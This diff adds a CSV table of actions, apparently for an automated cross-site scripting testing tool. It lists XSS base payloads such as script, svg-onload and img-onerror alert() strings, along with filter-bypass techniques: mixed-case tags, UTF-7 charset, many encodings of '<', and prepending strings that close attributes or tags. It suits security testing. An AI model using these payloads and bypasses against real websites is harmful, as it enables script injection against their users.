@@ -1,0 +1,58 @@
+Action,Description,Category
+SendHTTPRequest,Send the HTTP request with a generic input string (i.e. testNTTData),Action_HTTP
+SetCharsetUTF7,Send in input charset utf7,Action_Charset
+MixUppercase,Mix lower and upper case character for the tag in order to bypass filter,Action_Tag
+SemicolonUrlEncoding,The  isemicolon s encoded as %3B,Action_Semicolon
+SemicolonClean,The semicolon  is not encoded,Action_Semicolon
+DoubleQuoteClean,The double quote is not encoded,Action_DoubleQuoteEncoding
+DoubleQuoteRemove,Remove double quote,Action_DoubleQuoteEncoding
+EncodeQuoteBacktick,Encode double quote with backtick,Action_DoubleQuoteEncoding
+EscapeDoubleQuote,"The double quote is escaped \""",Action_DoubleQuoteEncoding
+EncodeDoubleQuoteLineFeed,"Encode "" with %0A",Action_DoubleQuoteEncoding
+UTF7Encoding,Encode double quote with utf7 encoding,Action_DoubleQuoteEncoding
+N/A,Not relevant in this status,Generic
+SvgBasePayload,<svg onload=alert()>,Action_BasePayload
+ScriptBasePayload,<script>alert(1)</script>,Action_BasePayload
+AlertPayload,alert(1)  as payload,Action_BasePayload
+GenericStringPayload,testString as payload,Action_BasePayload
+OnMouseOverPayload,onmouseover=alert(1),Action_BasePayload
+QuotePayload,single quote (') as payload,Action_BasePayload
+OnErrorPayload,onerror=alert(1),Action_BasePayload
+OnFocusPayload,"onfocus=""alert(1)"" autofocus=""""",Action_BasePayload
+InSrcPayload,xss” onerror=alert(1),Action_BasePayload
+ImgStringPayload,<img src=xss onerror=alert(1)>,Action_BasePayload
+AllValuesPayload," ""<>sss as payload",Action_BasePayload
+JavascriptBasePayload,"javascript://""+alert(1)  as payload",Action_BasePayload
+BaseHTTPGoogleRequest,https://google.com,Action_BasePayload
+QuoteClean,The single quote is not encoded,Action_SingleQuoteEncoding
+EncodeQuoteBacktick,The single quote is converted to backtick,Action_SingleQuoteEncoding
+EncodeQuoteLineFeed,Encode ' with %0A,Action_SingleQuoteEncoding
+EncodeSpaceSlash,Encode space with slash,Action_SpaceEncoding
+SpaceClean,Spaces not encoded,Action_SpaceEncoding
+EncodingTagBracketTest,"Send all encodings of <testNTT string:
+<testString
+%3CtestString
+&lttestString
+....
+&#X0003C;testString
+&#X00003C;testString
+&#X000003C;testString
+\u003ctestString
+\u003CtestString",Action_TagBracket
+AppendJSFix,Append a string that fixes the JS code,Action_Append
+AppendParenthesisAndSemicolon,Append ) to Payload,Action_Append
+AppendParenthesisAndSemicolonAndUrlSemicolon,Append )%3B,Action_Append
+AppendLineFeed,A %0A is appended,Action_Append
+AppendNothing,Nothing is appended,Action_Append
+PrependSingleQuoteParenthesisAndSemicolonAndUrlSemicolon,Prepend ')%3B,Action_Prepend
+PrependJSFix,Prepend a string that fixes the JS code,Action_Prepend
+PrependDoubleQuote,"Prepend xss""",Action_Prepend
+PrependHtmlCloseAttributeInTag,"Close an attribute in order to create an atack as the following:
+"" onfocus=""alert(1)"" autofocus=""",Action_Prepend
+PrependSpace,Prepend xss+space,Action_Prepend
+PrependSingleQuote,Prepend xss',Action_Prepend
+PrependParenthesisAndSemicolon,Prepend ),Action_Prepend
+PrependLineFeed,A %0A is prepended,Action_Prepend
+PrependHtmlClosureTag,Close Html tag in order to include attack ,Action_Prepend
+PrependNothing,Nothing is prepended,Action_Prepend
+EncodingParenthesisBacktick,The parenthesis is converted to backtick,Action_ParenthesisEncoding
